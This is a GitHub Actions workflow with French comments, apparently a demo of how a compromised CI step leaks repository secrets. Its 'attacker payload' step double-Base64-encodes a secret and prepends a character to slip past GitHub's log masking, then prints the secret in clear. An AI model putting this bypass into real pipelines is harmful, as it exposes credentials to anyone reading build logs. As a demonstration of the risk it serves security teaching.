name: Demo leak secret compromis

on: [push]

jobs:
  demo:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      # Étape normale
      - name: Affichage légitime
        run: |
          echo "----- Début du log légitime -----"
          echo "La valeur du secret est : $DEMO_SECRET"
          echo "----- Fin du log légitime -----"
        env:
          DEMO_SECRET: ${{ secrets.DEMO_SECRET1 }}

      # Étape malveillante
      - name: Étape compromise
        shell: bash
        run: |
          echo ""
          echo "===== ATTACKER PAYLOAD ACTIVÉ ====="
          echo "[Attacker] Lecture de la variable d'environnement..."
          
          # Le secret sera masqué s'il est affiché tel quel
          echo "[Attacker] Secret en clair masqué par GitHub : $DEMO_SECRET"
          echo ""
          
          echo "[Attacker] Double encodage Base64 :"
          encoded=$(echo -n "$DEMO_SECRET" | base64 | base64)
          echo "$encoded"
          echo ""
          
          echo "[Attacker] Décodage du double Base64 (mais GitHub masque encore) :"
          decoded=$(echo "$encoded" | base64 --decode | base64 --decode)
      
          # Pour contourner le masquage GitHub,
          # on ajoute un caractère temporaire puis on le retire
          echo "[Attacker] Décodage contournant le masquage GitHub :"
          safe_output="X${decoded}"
          echo "$safe_output"
      
          echo ""
          echo "Vrai secret (sans le X ajouté) :"
          echo "$safe_output" | sed 's/^X//'
          
          echo ""
          echo "===== FIN DU PAYLOAD ====="
        env:
          DEMO_SECRET: ${{ secrets.DEMO_SECRET1 }}
